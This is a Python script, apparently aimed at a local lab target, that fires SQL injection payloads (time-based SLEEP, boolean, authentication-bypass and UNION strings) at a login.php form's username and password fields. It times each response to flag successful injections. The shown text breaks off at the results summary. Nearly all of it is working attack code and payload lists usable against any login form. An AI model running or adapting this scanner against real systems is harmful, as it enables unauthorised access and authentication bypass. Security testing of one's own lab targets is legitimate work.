import requests
import time
import json
from datetime import datetime

# Configuration - using more robust connection settings
BASE_URL = "http://127.0.0.1:33168"
LOGIN_ENDPOINT = "/login.php"
TIMEOUT = 15
MAX_RETRIES = 2

# Initialize session with retries
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (SQLi-Test-Suite)',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'keep-alive'
})

# Configure session for better reliability
adapter = requests.adapters.HTTPAdapter(
    max_retries=requests.packages.urllib3.util.retry.Retry(
        total=2,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504]
    )
)
session.mount('http://', adapter)

# Streamlined payload categories for reliability
payloads = {
    "time_based_mysql": [
        "admin' OR SLEEP(3)-- ",
        "admin' UNION SELECT SLEEP(3)-- ",
        "' OR IF(1=1,SLEEP(3),0)-- ",
    ],
    "boolean_based": [
        "' OR '1'='1'-- ",
        "admin'-- ",
        "' OR 1=1-- ",
    ],
    "auth_bypass": [
        "' OR 1=1-- ",
        "' OR '1'='1'-- ",
        "admin'-- ",
        "' OR 1=1 LIMIT 1-- ",
    ],
    "union_based": [
        "' UNION SELECT 1,2-- ",
        "' UNION SELECT NULL,NULL-- ",
    ],
}

# Test tracking
test_results = {
    "total_tests": 0,
    "baseline_time": 0,
    "time_anomalies": [],
    "successful_payloads": [],
    "different_patterns": {}
}

# Helper function to make requests
def make_request(data, description):
    """Make a POST request with error handling"""
    test_results["total_tests"] += 1
    
    for attempt in range(MAX_RETRIES + 1):
        try:
            start_time = time.time()
            response = session.post(
                f"{BASE_URL}{LOGIN_ENDPOINT}",
                data=data,
                timeout=TIMEOUT,
                allow_redirects=False
            )
            end_time = time.time()
            response_time = end_time - start_time
            
            result = {
                "description": description,
                "data": data,
                "response_time": response_time,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_snippet": response.text[:300].replace('\n', ' '),
                "full_response": response.text[:1000]
            }
            
            print(f"  [{response_time:.2f}s | Status: {response.status_code}] {description}")
            
            return result
            
        except requests.exceptions.Timeout:
            print(f"  [TIMEOUT after {TIMEOUT}s] {description}")
            return {"error": "timeout", "description": description}
        except requests.exceptions.ConnectionError as e:
            if attempt < MAX_RETRIES:
                print(f"  [Connection error, retrying...] {description}")
                time.sleep(1)
                continue
            print(f"  [Connection failed] {description}")
            return {"error": "connection", "description": description}
        except Exception as e:
            print(f"  [Error: {str(e)[:50]}] {description}")
            return {"error": str(e), "description": description}

# Get baseline
print("[+] Getting baseline response...")
baseline = make_request({"username": "test", "password": "test"}, "baseline_normal_login")
if "response_time" in baseline:
    test_results["baseline_time"] = baseline["response_time"]
    print(f"[+] Baseline time: {baseline['response_time']:.3f}s\n")

print("[+] Starting SQL injection tests")
print("=" * 80)

# Test payloads
for category, category_payloads in payloads.items():
    print(f"\n[=== {category.upper().replace('_', ' ')} ===]")
    
    for payload in category_payloads:
        # Test in username field
        result = make_request({"username": payload, "password": ""}, f"username_field: {payload[:50]}")
        if "response_time" in result:
            # Check for time anomalies
            if result["response_time"] >= 3.0:
                test_results["time_anomalies"].append({
                    "payload": payload,
                    "field": "username",
                    "delay": result["response_time"]
                })
                test_results["successful_payloads"].append({
                    "type": "time_based",
                    "payload": payload,
                    "field": "username",
                    "response_time": result["response_time"]
                })
            
            # Check for pattern differences
            key = f"{result['status_code']}_{result['response_length']}"
            if key not in test_results["different_patterns"]:
                test_results["different_patterns"][key] = result
        
        # Test in password field  
        result = make_request({"username": "", "password": payload}, f"password_field: {payload[:50]}")
        if "response_time" in result and result["response_time"] >= 3.0:
            test_results["time_anomalies"].append({
                "payload": payload,
                "field": "password",
                "delay": result["response_time"]
            })
        
        # Test in both fields
        result = make_request({"username": payload, "password": payload}, f"both_fields: {payload[:50]}")

print("\n" + "=" * 80)
print("TEST RESULTS SUMMARY")
print("=" * 80)

print(f"\nTotal Tests: {test_results['total_tests']}")
print(f"Baseline Response Time: {test_results['baseline_time']:.3f}s")

if test_results["time_anomalies"]:
